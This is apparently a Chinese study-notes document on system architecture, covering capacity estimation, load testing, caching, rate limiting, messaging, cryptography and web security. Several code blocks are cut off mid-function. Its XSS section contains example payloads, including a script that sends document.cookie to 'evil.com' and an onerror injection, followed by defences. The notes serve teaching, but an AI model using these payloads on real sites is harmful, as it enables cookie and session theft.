#### **2. QPS预估公式**

```python
# 基于业务数据的QPS预估
class QPSEstimator:
    
    def estimate_peak_qps(self, business_data):
        """
        计算峰值QPS
        公式: 峰值QPS = 预估用户数 × 转化率 × 接口调用频率
        """
        # 基础数据
        estimated_users = 1000000  # 预估用户数
        daily_active_rate = 0.2   # 日活率
        peak_hour_ratio = 0.15    # 峰值小时占比
        conversion_rate = 0.1     # 转化率
        
        # 计算
        daily_active_users = estimated_users * daily_active_rate
        peak_hour_users = daily_active_users * peak_hour_ratio
        peak_concurrent_users = peak_hour_users * 0.1  # 10%并发
        
        # 接口调用频率
        api_call_per_user_per_hour = {
            "homepage": 5,      # 首页: 5次/用户/小时
            "product_detail": 3, # 商品详情: 3次
            "add_to_cart": 0.5,  # 加购: 0.5次
            "place_order": 0.1,  # 下单: 0.1次
        }
        
        # 计算各接口峰值QPS
        for api, call_rate in api_call_per_user_per_hour.items():
            qps = peak_concurrent_users * call_rate / 3600
            print(f"{api} 峰值QPS: {qps:.2f}")
        
        return peak_concurrent_users
```

#### **1. 请求标注 - 识别压测流量**

```java
// 在HTTP Header中标记压测流量
public class TestFlagInterceptor implements HandlerInterceptor {
    
    private static final String TEST_FLAG_HEADER = "X-Pressure-Test";
    private static final String TEST_FLAG_VALUE = "true";
    private static final String TEST_USER_ID_PREFIX = "test_";
    
    @Override
    public boolean preHandle(HttpServletRequest request, 
                           HttpServletResponse response, 
                           Object handler) {
        // 检查是否为压测流量
        String testFlag = request.getHeader(TEST_FLAG_HEADER);
        boolean isPressureTest = TEST_FLAG_VALUE.equals(testFlag);
        
        if (isPressureTest) {
            // 标记当前线程上下文
            MDC.put("is_pressure_test", "true");
            
            // 修改用户ID，避免污染生产数据
            String userId = request.getHeader("X-User-ID");
            if (userId != null && !userId.startsWith(TEST_USER_ID_PREFIX)) {
                request.setAttribute("original_user_id", userId);
                request.setHeader("X-User-ID", TEST_USER_ID_PREFIX + userId);
            }
            
            // 使用压测配置
            ConfigManager.useTestConfig();
        }
        
        return true;
    }
}
```

```bash
# GoReplay使用示例

# 2. 回放到测试环境
sudo ./gor --input-file requests.gor --output-http "http://test-env:8080"

# 3. 实时复制（带过滤）
sudo ./gor --input-raw :8080 \
  --output-http "http://test-env:8080" \
  --http-allow-method GET \
  --http-allow-method POST \
  --http-disallow-url /admin \
  --output-http-stats

sudo ./gor --input-file "requests.gor" \
  --output-http "http://test-env:8080" \
  --output-http-workers 10 \
  --output-http-timeout 5s \

  --speed 2  # 2倍速播放

# 特点：

# ✅ 支持HTTP过滤
# ✅ 可离线回放
```

```python
# 自动化瓶颈分析报告
class BottleneckAnalyzer:
    
    def analyze_performance_data(self, metrics_data):
        """分析性能数据，识别瓶颈"""
        
        bottlenecks = []
        
        # CPU分析
        if metrics_data['cpu_usage'] > 80:
            bottlenecks.append({
                'type': 'CPU瓶颈',
                'severity': 'high',
                'description': f"CPU使用率 {metrics_data['cpu_usage']}% 过高",
                'suggestion': '优化计算密集型代码，增加实例数'
            })
        
        # 内存分析
        if metrics_data['gc_time'] > 100:  # GC时间过长
            bottlenecks.append({
                'type': '内存GC瓶颈',
                'severity': 'high',
                'description': f"Full GC时间 {metrics_data['gc_time']}ms",
                'suggestion': '优化内存使用，调整JVM参数'
            })
        
        # 数据库分析
        if metrics_data['slow_queries'] > 10:
            bottlenecks.append({
                'type': '数据库慢查询',
                'severity': 'medium',
                'description': f"慢查询数量 {metrics_data['slow_queries']}",
                'suggestion': '优化SQL，添加索引，分库分表'
            })
        
        return bottlenecks
```

## **横向扩容 Scale-out**

> 逻辑层做分布式微服务拆分，存储层引入分布式数据库提升伸缩性
>
> 

📊 横向扩容 vs 纵向扩容

| **维度**   | **横向扩容 Scale-out** | **纵向扩容 Scale-up** |
| ---------- | ---------------------- | --------------------- |
| **策略**   | 增加更多节点           | 升级单个节点配置      |
| **成本**   | 线性增长               | 指数增长              |
| **上限**   | 理论上无限             | 硬件上限              |
| **可用性** | 更高（多节点）         | 较低（单点）          |
| **复杂度** | 高（需分布式协调）     | 低                    |



**一句话总结**

**横向扩容核心：逻辑层通过微服务拆分实现水平扩展，存储层通过分布式数据库和分片技术提升伸缩性，配合无状态化设计、自动伸缩策略和分布式事务保障，实现系统容量线性增长。**

k8s的StatefulSet 的核心特性

1. **稳定的网络标识**

每个 Pod 拥有固定、可预测的主机名：

- 命名模式：`<statefulset-name>-<ordinal-index>`
- 例如：`web-0`, `web-1`, `web-2`
- 通过 Headless Service (`ClusterIP: None`) 暴露，每个 Pod 有独立的 DNS 记录

2. **稳定的持久化存储**

- 每个 Pod 对应独立的 PersistentVolumeClaim (PVC)
- Pod 重建/重启时，会自动挂载相同的 PVC
- 存储声明模板：`volumeClaimTemplates`

3. **有序的部署管理**

- **顺序创建**：从索引 0 开始依次创建 Pod
- **顺序删除**：从最大索引开始依次删除 Pod
- **顺序滚动更新**：从最大索引开始反向更新

```python
# 容量计算公式
def calculate_required_instances(total_qps, instance_qps, redundancy=1.5):
    """
    计算所需实例数
    total_qps: 总请求量
    instance_qps: 单实例处理能力
    redundancy: 冗余系数
    """
    return math.ceil(total_qps / instance_qps * redundancy)

def calculate_storage_shards(total_data, shard_capacity, growth_rate=0.1):
    """
    计算分片数量
    total_data: 总数据量
    shard_capacity: 单分片容量
    growth_rate: 年增长率
    """
    # 预留一年增长空间
    future_data = total_data * (1 + growth_rate)
    return math.ceil(future_data / shard_capacity)

def estimate_network_bandwidth(qps, avg_response_size):
    """
    估算网络带宽需求
    qps: 每秒请求数
    avg_response_size: 平均响应大小(字节)
    """
    # 请求+响应流量
    total_traffic = qps * avg_response_size * 2
    # 转换为Mbps
    return total_traffic * 8 / 1024 / 1024
```

```python
# 令牌桶实现
class TokenBucket:
    
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity        # 桶容量
        self.refill_rate = refill_rate  # 每秒补充速率
        self.tokens = capacity          # 当前令牌数
        self.last_refill = time.time()  # 上次补充时间
    
    def try_acquire(self, tokens=1):
        # 补充令牌
        now = time.time()
        time_passed = now - self.last_refill
        tokens_to_add = time_passed * self.refill_rate
        
        self.tokens = min(self.capacity, self.tokens + tokens_to_add)
        self.last_refill = now
        
        # 检查是否有足够令牌
        if self.tokens >= tokens:
            self.tokens -= tokens
            return True
        
        return False

# 使用示例
rate_limiter = TokenBucket(capacity=100, refill_rate=10)  # 每秒10个令牌，桶容量100

def handle_request():
    if not rate_limiter.try_acquire():
        raise RateLimitException("请求过于频繁")
    # 处理请求
    return process_request()
```

```python
# 熔断器状态机
class CircuitBreaker:
    
    def __init__(self, name, failure_threshold=5, reset_timeout=30):
        self.name = name
        self.failure_threshold = failure_threshold
        self.reset_timeout = reset_timeout
        self.state = "CLOSED"  # CLOSED, OPEN, HALF_OPEN
        self.failure_count = 0
        self.last_failure_time = None
    
    def execute(self, operation):
        if self.state == "OPEN":
            # 检查是否应该进入半开状态
            if time.time() - self.last_failure_time > self.reset_timeout:
                self.state = "HALF_OPEN"
            else:
                raise CircuitBreakerOpenException()
        
        try:
            # 执行操作
            result = operation()
            
            # 成功：重置计数
            if self.state == "HALF_OPEN":
                self.state = "CLOSED"
            self.failure_count = 0
            
            return result
            
        except Exception as e:
            # 失败：记录
            self.failure_count += 1
            self.last_failure_time = time.time()
            
            if self.failure_count >= self.failure_threshold:
                self.state = "OPEN"
            
            # 降级处理
            return self.fallback()

# 使用示例
breaker = CircuitBreaker("payment-service", failure_threshold=5)

def process_payment(order):
    return breaker.execute(lambda: payment_service.charge(order))
```

```java
class OptimizedOrderService {
    // 为不同资源使用不同的锁
    private final Map<Long, Object> stockLocks = new ConcurrentHashMap<>();
    private final Map<Long, Object> userLocks = new ConcurrentHashMap<>();
    
    public void processOrder(Order order) {
        // 1. 验证订单（无锁，只读）
        validateOrder(order);
        
        // 2. 扣减库存（只锁具体商品）
        deductStockWithLock(order);
        
        // 3. 计算运费（无锁，可并行）
        Future<BigDecimal> shippingFuture = executor.submit(
            () -> calculateShipping(order)
        );
        
        // 4. 生成发票（只锁用户）
        generateInvoiceWithLock(order);
        
        // 5. 等待运费计算
        BigDecimal shippingCost = shippingFuture.get();
    }
```

```java
// 读写分离注解
@Target({ElementType.METHOD, ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface ReadOnly {
    String value() default "slave";
}

// AOP实现
@Aspect
@Component
public class ReadWriteAspect {
    
    @Around("@annotation(readOnly)")
    public Object switchDataSource(ProceedingJoinPoint joinPoint, ReadOnly readOnly) throws Throwable {
        // 切换到从库
        DataSourceContextHolder.setDataSource(readOnly.value());
        
        try {
            return joinPoint.proceed();
        } finally {
            // 切回主库
            DataSourceContextHolder.clear();
        }
    }
}

    public void createOrder(Order order) {
```

### 本地缓存 vs 分布式缓存

| **维度**       | **本地缓存**     | **分布式缓存**   |
| -------------- | ---------------- | ---------------- |
| **存储位置**   | 应用进程内存     | 独立缓存服务     |
| **数据一致性** | 多实例不一致     | 全局一致         |
| **容量**       | 受内存限制       | 可水平扩展       |
| **性能**       | 纳秒级           | 微秒级           |
| **典型实现**   | Caffeine, Guava  | Redis, Memcached |
| **适用场景**   | 高频读、极少更新 | 共享数据、高并发 |

```java
// Redis分布式缓存
@Component
public class RedisCacheService {
    
    @Autowired
    private RedisTemplate<String, Object> redisTemplate;
    
    // 设置缓存
    public void set(String key, Object value, long timeout, TimeUnit unit) {
        redisTemplate.opsForValue().set(key, value, timeout, unit);
    }
    
    // 获取缓存
    public <T> T get(String key) {
        return (T) redisTemplate.opsForValue().get(key);
    }
    
    // 批量获取
    public <T> Map<String, T> mget(Collection<String> keys) {
        List<Object> values = redisTemplate.opsForValue().multiGet(keys);
        Map<String, T> result = new HashMap<>();
        int i = 0;
        for (String key : keys) {
            if (values.get(i) != null) {
                result.put(key, (T) values.get(i));
            }
            i++;
        }
        return result;
    }
    
    // 删除缓存
    public void delete(String key) {
        redisTemplate.delete(key);
    }
}
```

### 🎯 缓存三大问题

#### **1. 缓存穿透（Cache Penetration）**

**问题**：查询不存在的数据，缓存不命中，每次都查数据库

```java
// 解决方案1：空值缓存
public User getUser(Long userId) {
    User user = cache.get("user:" + userId);
    
    if (user != null) {
        if (user.getId() == -1) {  // 空值标记
            return null;
        }
        return user;
    }
    
    user = userDao.getById(userId);
    
    if (user == null) {
        // 缓存空值，短时间过期
        cache.set("user:" + userId, new User(-1L), 5, TimeUnit.MINUTES);
        return null;
    }
    
    cache.set("user:" + userId, user, 30, TimeUnit.MINUTES);
    return user;
}

// 解决方案2：布隆过滤器
@Component
public class BloomFilterService {
    
    private BloomFilter<String> bloomFilter = BloomFilter.create(
        Funnels.stringFunnel(Charset.defaultCharset()), 
        1000000,  // 预期元素数量
        0.01      // 误判率
    );
    
    public boolean mightExist(String key) {
        return bloomFilter.mightContain(key);
    }
    
    public void add(String key) {
        bloomFilter.put(key);
    }
}

// 使用
```

**问题**：热点key过期瞬间，大量请求击穿到数据库

```java
// 解决方案1：互斥锁
public User getUserWithLock(Long userId) {
    String key = "user:" + userId;
    User user = cache.get(key);
    
    if (user != null) {
        return user;
    }
    
    // 获取分布式锁
    String lockKey = "lock:user:" + userId;
    boolean locked = redisLock.tryLock(lockKey, 3, TimeUnit.SECONDS);
    
    if (!locked) {
        // 没获取到锁，短暂等待后重试
        Thread.sleep(100);
        return getUserWithLock(userId);
    }
    
    try {
        // 双重检查
        user = cache.get(key);
        if (user != null) {
            return user;
        }
        
        // 查数据库
        user = userDao.getById(userId);
        if (user != null) {
            cache.set(key, user, 30, TimeUnit.MINUTES);
        } else {
            // 空值缓存
            cache.set(key, new User(-1L), 5, TimeUnit.MINUTES);
        }
        
        return user;
    } finally {
        redisLock.unlock(lockKey);
    }
}

// 解决方案2：逻辑过期
public class CacheData<T> {
    private T data;
    private long expireTime;  // 逻辑过期时间

        return System.currentTimeMillis() > expireTime;
    }
}

public User getUserWithLogicalExpire(Long userId) {
    String key = "user:" + userId;
    CacheData<User> cacheData = cache.get(key);
    
    if (cacheData == null) {
        return loadAndSet(userId);
    }
    
    if (!cacheData.isExpired()) {
        return cacheData.getData();
    }
    
    // 异步更新
    executor.submit(() -> {
        loadAndSet(userId);
    });
    
    return cacheData.getData();  // 返回旧数据
}
```

```java
public void splitBigList(String key, List<String> data) {
    int chunkSize = 1000;
    for (int i = 0; i < data.size(); i += chunkSize) {
        List<String> chunk = data.subList(i, Math.min(i + chunkSize, data.size()));
        redisTemplate.opsForList().rightPushAll(key + ":chunk:" + (i/chunkSize), chunk);

}
```

```java
@Component
public class HotKeyMonitor {
    
    private ConcurrentHashMap<String, AtomicLong> counter = new ConcurrentHashMap<>();
    
    @Around("@annotation(org.springframework.cache.annotation.Cacheable)")
    public Object monitor(ProceedingJoinPoint joinPoint) throws Throwable {
        // 提取key
        String key = extractCacheKey(joinPoint);
        
        // 计数
        counter.computeIfAbsent(key, k -> new AtomicLong()).incrementAndGet();
        
        // 定期清理
        if (counter.size() > 10000) {
            counter.clear();
        }
        
        return joinPoint.proceed();
    }
    
    // 定时上报

    public void reportHotKeys() {
        counter.entrySet().stream()
            .filter(e -> e.getValue().get() > 1000)  // 1分钟内超过1000次
            .forEach(e -> reportHotKey(e.getKey(), e.getValue().get()));
    }
}
```

```java
// 流量高峰时的订单处理
@Component
public class OrderProcessor {
    
    @Autowired
    private RabbitTemplate rabbitTemplate;
    
    // 同步处理（削峰前）
    public OrderResult processOrderSync(Order order) {
        // 直接处理业务逻辑
        validateOrder(order);          // 验证
        checkInventory(order);         // 库存
        processPayment(order);         // 支付
        sendNotification(order);       // 通知
        
        return new OrderResult("SUCCESS");
        // ❌ 高峰期：同步处理阻塞，响应慢

    // 异步削峰（削峰后）

        validateOrder(order);
        
        // 2. 消息入队
        rabbitTemplate.convertAndSend(
            "order.exchange",
            "order.create",
            new OrderMessage(order)
        );
        
        // 3. 立即返回
        return new OrderResult("PROCESSING");
        // ✅ 高峰期：快速响应，后台处理
    }
}
```

```java
@Component
public class RetryService {
    
    // 重试队列配置
    @Bean
    public Queue retryQueue() {
        Map<String, Object> args = new HashMap<>();
        args.put("x-dead-letter-exchange", "dlx.exchange");
        args.put("x-dead-letter-routing-key", "dlx.key");
        args.put("x-message-ttl", 10000);  // 10秒后重试
        
        return new Queue("retry.queue", true, false, false, args);
    }
    
    // 消费重试
    @RabbitListener(queues = "order.queue")
    public void handleWithRetry(OrderMessage message, Channel channel, 
                               @Header(AmqpHeaders.DELIVERY_TAG) long tag) {
        try {
            processOrder(message);
            channel.basicAck(tag, false);  // 确认成功
            
        } catch (Exception e) {
            // 获取重试次数
            Integer retryCount = getRetryCount(message);
            
            if (retryCount < 3) {
                // 重试
                retry(message, retryCount + 1);
                channel.basicNack(tag, false, false);  // 不重入队列
            } else {
                // 进入死信队列
                channel.basicNack(tag, false, false);
                sendToDLQ(message, e);
            }
        }
    }
    
    private void retry(OrderMessage message, int retryCount) {
        // 指数退避
        long delay = (long) Math.pow(2, retryCount) * 1000;
        
        // 发送到延迟队列
        rabbitTemplate.convertAndSend(
            "retry.exchange",
            "retry.key",
            message,
            m -> {
                m.getMessageProperties().setDelay(Math.toIntExact(delay));
                m.getMessageProperties().setHeader("retry-count", retryCount);
                return m;
            }
        );
    }
}
```

```html
// IntersectionObserver实现懒加载
class LazyLoader {
    constructor() {
        this.observer = new IntersectionObserver(
            this.handleIntersection.bind(this),
            {
                rootMargin: '50px 0px',  // 提前50px加载
                threshold: 0.1
            }
        );
        
        this.init();
    }
    
    init() {
        // 找到所有需要懒加载的元素
        const lazyImages = document.querySelectorAll('img[data-src]');
        const lazyBg = document.querySelectorAll('[data-bg]');
        
        [...lazyImages, ...lazyBg].forEach(el => {
            this.observer.observe(el);
        });
    }
    
    handleIntersection(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const target = entry.target;
                
                if (target.tagName === 'IMG') {
                    this.loadImage(target);
                } else {
                    this.loadBackground(target);
                }
                
                this.observer.unobserve(target);
            }
        });
    }
    
    loadImage(img) {
        const src = img.dataset.src;
        if (!src) return;
        
        img.src = src;
        img.removeAttribute('data-src');
    }
    
    loadBackground(el) {
        const bg = el.dataset.bg;
        if (!bg) return;
        
        el.style.backgroundImage = bg;
        el.removeAttribute('data-bg');
    }
}
```

```javascript
class ImageCompressor {
    
    async compressImage(file, options = {}) {
        const { maxWidth = 1920, quality = 0.8, format = 'webp' } = options;
        
        return new Promise((resolve, reject) => {
            const img = new Image();
            const reader = new FileReader();
            
            reader.onload = (e) => {
                img.src = e.target.result;
            };
            
            img.onload = () => {
                // 计算新尺寸
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                let width = img.width;
                let height = img.height;
                
                if (width > maxWidth) {
                    height = Math.round(height * maxWidth / width);
                    width = maxWidth;
                }
                
                canvas.width = width;
                canvas.height = height;
                
                // 绘制并压缩
                ctx.drawImage(img, 0, 0, width, height);
                
                // 转为目标格式
                canvas.toBlob(
                    (blob) => resolve(blob),
                    `image/${format}`,
                    quality
                );
            };
            
            reader.readAsDataURL(file);
        });
    }
}
```

```javascript
            ttfb: Math.round(entry.responseStart - entry.requestStart),
            download: Math.round(entry.responseEnd - entry.responseStart)
        };
        
        // 发送到监控系统
        analytics.send('resource_timing', timing);
    }

    detectUnusedResources() {
        const usedResources = this.getUsedResources();

        loadedResources.forEach(resource => {
            if (!usedResources.has(resource.name)) {
                this.reportUnusedResource(resource);

        });
    }
```

```java
@Component
public class IntegrityService {
    
    // 生成数据签名
    public String signData(String data, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initSign(privateKey);
        signature.update(data.getBytes());
        
        byte[] digitalSignature = signature.sign();
        return Base64.getEncoder().encodeToString(digitalSignature);
    }
    
    // 验证数据签名
    public boolean verifySignature(String data, String signatureStr, 
                                  PublicKey publicKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initVerify(publicKey);
        signature.update(data.getBytes());
        
        byte[] signatureBytes = Base64.getDecoder().decode(signatureStr);
        return signature.verify(signatureBytes);
    }
    
    // 防篡改哈希
    public String calculateHMAC(String data, String key) throws Exception {
        Mac hmac = Mac.getInstance("HmacSHA256");
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "HmacSHA256");
        hmac.init(secretKey);
        
        byte[] hmacBytes = hmac.doFinal(data.getBytes());
        return Hex.encodeHexString(hmacBytes);
    }
}
```

```java
@Component
public class JwtTokenProvider {
    
    private final String jwtSecret = "your-secret-key";
    private final long jwtExpiration = 86400000; // 24小时
    
    public String generateToken(UserDetails userDetails) {
        Date now = new Date();
        Date expiryDate = new Date(now.getTime() + jwtExpiration);
        
        return Jwts.builder()
            .setSubject(userDetails.getUsername())
            .setIssuedAt(now)
            .setExpiration(expiryDate)
            .signWith(SignatureAlgorithm.HS512, jwtSecret)
            .compact();
    }
    
    public boolean validateToken(String token) {
        try {
            Jwts.parser().setSigningKey(jwtSecret).parseClaimsJws(token);
            return true;
        } catch (Exception ex) {
            return false;
        }
    }
    
    public String getUsernameFromToken(String token) {
        Claims claims = Jwts.parser()
            .setSigningKey(jwtSecret)
            .parseClaimsJws(token)
            .getBody();
        
        return claims.getSubject();
    }
```

```java
@Aspect
@Component
@Slf4j
public class AuditAspect {
    
    @Autowired
    private AuditLogService auditLogService;
    
    @Around("@annotation(audit)")
    public Object auditLog(ProceedingJoinPoint joinPoint, Audit audit) throws Throwable {
        long startTime = System.currentTimeMillis();
        
        // 获取当前用户
        User currentUser = SecurityContextHolder.getContext()
            .getAuthentication()
            .getPrincipal();
        
        // 获取方法信息
        MethodSignature signature = (MethodSignature) joinPoint.getSignature();
        String methodName = signature.getMethod().getName();
        String className = joinPoint.getTarget().getClass().getSimpleName();
        
        // 获取参数
        Object[] args = joinPoint.getArgs();
        
        try {
            // 执行原方法
            Object result = joinPoint.proceed();
            
            long endTime = System.currentTimeMillis();
            
            // 记录成功日志
            auditLogService.logSuccess(
                currentUser.getUsername(),
                className + "." + methodName,
                args,
                result,
                endTime - startTime
            );
            
            return result;
            
        } catch (Exception e) {
            long endTime = System.currentTimeMillis();
            
            // 记录失败日志
            auditLogService.logFailure(
                currentUser.getUsername(),
                className + "." + methodName,
                args,
                e.getMessage(),
                endTime - startTime
            );
            
            throw e;
        }
    }
}
```

```python
def aes_encrypt(明文, 密钥):
    密文 = AES算法(明文, 密钥, 模式='CBC', IV=随机向量)
```

#### RSA 密钥对的特殊构造

> 1. 密钥生成的数学基础

RSA 密钥对是基于**数论中的欧拉定理和大整数分解难题**构造的。这对密钥并非两个独立的随机数，而是一个**数学上紧密关联的孪生对**。

**密钥生成步骤**：

```python
# 简化版密钥生成过程
1. 选择两个大质数 p 和 q
   p = 61, q = 53  # 实际中这两个数有数百位

2. 计算 n = p × q
   n = 61 × 53 = 3233  # 模数，公开

3. 计算欧拉函数 φ(n) = (p-1) × (q-1)
   φ(3233) = (61-1) × (53-1) = 3120

4. 选择加密指数 e，满足 1 < e < φ(n) 且与 φ(n) 互质
   e = 17  # 通常固定为 65537

5. 计算解密指数 d，满足 e × d ≡ 1 (mod φ(n))
   d = 2753  # 通过扩展欧几里得算法求得
```

**得到的密钥对**：

- **公钥** = `(n, e)`= `(3233, 17)`← 公开
- **私钥** = `(n, d)`= `(3233, 2753)`← 保密

> 2. 密钥间的数学关系

**关键等式**：`e × d ≡ 1 (mod φ(n))`

这意味着：

- `e`和 `d`是**模 φ(n) 下的乘法逆元**
- 这个关系确保了解密过程的可行性
- 知道 `e`和 `n`无法推导出 `d`，除非能分解 `n`得到 `p`和 `q`



#### **两种用途**

> 1、加密传输  2、数字签名

![image-20260312170823920](系统架构篇（高级）.assets/image-20260312170823920.png)

**伪代码示例**

```python
# RSA 加密/解密
def rsa_encrypt(明文, 对方公钥):
    return RSA.加密(明文, 对方公钥)  # 只有对方私钥能解

def rsa_decrypt(密文, 自己私钥):
    return RSA.解密(密文, 自己私钥)  # 用自己的私钥解密

# RSA 签名/验签
def rsa_sign(数据, 自己私钥):
    哈希 = SHA256(数据)
    签名 = RSA.加密(哈希, 自己私钥)  # 用私钥"加密"哈希
    return 签名

def rsa_verify(数据, 签名, 对方公钥):
    哈希1 = SHA256(数据)
    哈希2 = RSA.解密(签名, 对方公钥)  # 用公钥"解密"得哈希
    return 哈希1 == 哈希2
```

##### 为何是客户端生成AES秘钥的？

在 HTTPS 的 TLS 握手过程中，**客户端生成对称加密密钥 K** 是出于**安全设计、信任模型和协议效率**的综合考虑。以下是详细原因分析：

1. **防止服务器预知密钥（防中间人攻击）**

- 如果**服务器生成密钥 K**，那么：
  - 服务器知道 K，可以解密所有后续通信。
  - 如果服务器被攻破或被恶意控制，攻击者可以获取 K，进而解密所有历史通信。
  - 更重要的是，**如果服务器是中间人（MITM）**，它可以直接生成密钥并伪装成合法服务器。
- 如果**客户端生成密钥 K**，并用**服务器的公钥加密后发送**：
  - 只有拥有对应**私钥的服务器**才能解密得到 K。
  - 即使中间人截获了加密后的 K，也无法解密（因为没有私钥）。
  - 服务器在解密后才获得 K，确保了**密钥从未在明文或易被窃取的形式下传输**。

✅ **安全性提升**：密钥由客户端生成，服务器被动接收，避免了服务器成为“密钥泄露点”。



2. **符合 TLS 的信任模型：服务器是可信方**

- TLS 的设计假设是：
  - **服务器是可信的**（通过证书验证）。
  - **客户端是主动方**（发起连接、选择密钥、验证服务器）。
- 客户端生成密钥，然后“交给”服务器，符合“客户端信任服务器能安全保管密钥”的模型。
- 如果反过来，服务器生成密钥并“发给”客户端，客户端的信任感会降低 —— 为什么我要相信你（服务器）给我的是一个安全的、未被篡改的密钥？

✅ **信任模型一致**：客户端主导密钥生成，服务器被动接受，符合“客户端信任服务器”的前提。



3. **避免服务器端的密钥管理负担**

- 如果服务器生成密钥：
  - 需要为每个连接生成唯一密钥，并安全地存储/传输给客户端。
  - 增加了服务器端的密钥管理复杂度。
- 客户端生成密钥：
  - 客户端本地生成，无需服务器参与生成过程。
  - 只需要加密发送给服务器，服务器端只需解密即可。

✅ **效率与简化**：客户端生成密钥，减少服务器端负担，更符合分布式系统的设计原则。



4. **防止重放攻击和密钥复用**

- 客户端生成的是**随机数**（通常结合客户端随机数、服务器随机数、预主密钥等生成最终会话密钥）。
- 每次连接都重新生成，确保**密钥唯一性**。
- 如果服务器生成密钥，可能被攻击者重放旧的密钥（虽然 TLS 有随机数机制，但客户端生成更主动控制随机性）。

✅ **唯一性与新鲜性**：客户端生成密钥，结合随机数，确保每次会话密钥不同。



5. **兼容性与标准化**

- TLS 协议（RFC 5246 等）标准规定：
  - 客户端生成 **Pre-Master Secret**（预主密钥），然后用服务器公钥加密发送给服务器。
  - 双方再基于此生成 Master Secret，最终派生出会话密钥 K。（更加安全）
- 这种设计是**行业共识**，被广泛支持，所有主流浏览器、服务器、CA 都遵循。

✅ **标准化与兼容性**：遵循国际标准，确保全球互通。

```markdown
   ↑                    ↓
 原始                无法反推
```

**伪代码示例**

```python
import hashlib
import os
import bcrypt

# 1. 基础SHA256加盐
def hash_password_sha256(密码):
    盐 = os.urandom(16)  # 生成16字节随机盐
    哈希 = hashlib.sha256(密码.encode() + 盐).hexdigest()
    return f"{盐.hex()}:{哈希}"  # 存储 盐:哈希

def verify_password_sha256(输入密码, 存储值):
    盐_hex, 存储哈希 = 存储值.split(":")
    盐 = bytes.fromhex(盐_hex)
    输入哈希 = hashlib.sha256(输入密码.encode() + 盐).hexdigest()
    return 输入哈希 == 存储哈希

# 2. 专业方式：bcrypt（推荐）
def hash_password_bcrypt(密码):
    # 自动加盐，包含成本因子控制计算时间
    return bcrypt.hashpw(密码.encode(), bcrypt.gensalt(12))

def verify_password_bcrypt(输入密码, 存储哈希):
    return bcrypt.checkpw(输入密码.encode(), 存储哈希)
```

| **典型场景** | HTTPS数据传输、文件加密 | TLS握手、SSH登录、代码签名 | 密码存储、Git提交、区块链 |

```markdown
• 密码永远用哈希存储（加盐）
```

### 1️⃣ XSS攻击（Cross-Site Scripting）

**核心：恶意脚本在用户浏览器执行**

<img src="系统架构篇（高级）.assets/image-20260317150533835.png" alt="image-20260317150533835" style="zoom: 33%;" />



#### 🎯 核心理解

**XSS 中的"Cross-Site"（跨站）** 指的是**攻击者的恶意代码能够跨越网站的边界，在受害者的浏览器中执行**。这个"跨"字是理解 XSS 攻击本质的关键。

**Cross-Site 的"跨"体现在三个层面**：

| 跨越的边界     | 含义                             | 示例                                |
| -------------- | -------------------------------- | ----------------------------------- |
| **跨信任边界** | 用户信任的网站 vs 攻击者的代码   | 用户信任网站A，但执行了攻击者的代码 |
| **跨权限边界** | 用户在当前网站的权限被攻击者利用 | 攻击者利用用户登录态进行操作        |
| **跨执行环境** | 恶意代码在网站的正常环境中执行   | 攻击脚本混入正常页面一起运行        |



#### **三种XSS类型**

| **类型**   | **触发方式**       | **示例场景**       | **危险等级** |
| ---------- | ------------------ | ------------------ | ------------ |
| **反射型** | URL参数直接输出    | 搜索框输入恶意脚本 | ⭐⭐⭐          |
| **存储型** | 恶意脚本存入数据库 | 评论区/用户资料    | ⭐⭐⭐⭐⭐        |
| **DOM型**  | 前端JS操作DOM      | innerHTML等操作    | ⭐⭐⭐⭐         |

1. 反射型 XSS（Reflected XSS）

**跨站过程**：

```markdown
攻击者构造恶意URL → 诱骗用户点击 → 网站将恶意内容反射回页面 → 执行
    攻击者的域名         信任的网站域名
```

**示例**：

```html
<!-- 攻击者构造URL -->
https://trust-site.com/search?q=<script>stealCookie()</script>

<!-- 用户点击后，信任网站返回： -->
<p>搜索结果：<script>stealCookie()</script></p>
<!-- 恶意脚本在信任网站上下文中执行 -->
```

==》反射型是攻击服务器，比如拿到服务器的cookie信息等



2. 存储型 XSS（Stored XSS）

**跨站过程**：

```markdown
攻击者提交恶意内容 → 网站存储到数据库 → 其他用户访问时加载 → 执行
  （通过信任网站）     （持久化存储）     （在信任网站中运行）
```

**示例**：

```javascript
// 攻击者在论坛发帖
帖子内容：<script>sendCookie('evil.com')</script>

// 其他用户浏览该帖子时
// 恶意脚本在他们浏览器的论坛上下文中执行
```

==》影响范围更大，会影响其他用户。



3. DOM 型 XSS（DOM-based XSS）

> **DOM 型 XSS** 是一种**完全在客户端浏览器中发生**的 XSS 攻击，恶意载荷**不经过服务器处理**，而是通过客户端的 JavaScript 直接修改 DOM 树来执行攻击代码。

**跨站过程**：

```markdown
用户访问正常页面 → 客户端JavaScript处理URL → 恶意代码修改DOM → 执行
  （信任网站）      （不经过服务器）         （在页面上下文中）
```

**示例**：

```javascript
// 页面中有这样的代码
let name = decodeURI(window.location.hash.substring(1));
document.getElementById("welcome").innerHTML = "Hello " + name;

// 攻击URL
https://trust-site.com/#<img src=x onerror=stealData()>

// 恶意代码直接在客户端执行
```





#### **攻击案例**

```javascript
// 攻击者输入到评论框
<script>
    // 1. 窃取Cookie
    fetch('https://evil.com/steal?cookie=' + document.cookie);
    
    // 2. 钓鱼表单
    document.body.innerHTML = '<form>请重新登录...</form>';
    
    // 3. 重定向到恶意网站
    window.location.href = 'https://phishing.com';
</script>
```

#### **防御方案**

```yaml
防御策略:
  # 1. 输入过滤
  输入处理:
    - 白名单过滤: 只允许安全字符
    - HTML实体编码: < → &lt;, > → &gt;
    - 移除敏感标签: script, style, iframe
    
  # 2. 输出转义
  输出处理:
    - HTML上下文: 转义<>&"'/
    - JavaScript上下文: 转义引号和斜杠
    - URL上下文: URL编码
    - CSS上下文: 严格过滤
    
  # 3. CSP策略
  Content-Security-Policy:
    - script-src 'self'  # 只允许同源脚本
    - style-src 'self'    # 只允许同源样式
    - img-src 'self'      # 只允许同源图片
    - connect-src 'self'  # 限制AJAX请求
    
  # 4. Cookie保护
  Cookie设置:
    - HttpOnly: 禁止JS访问
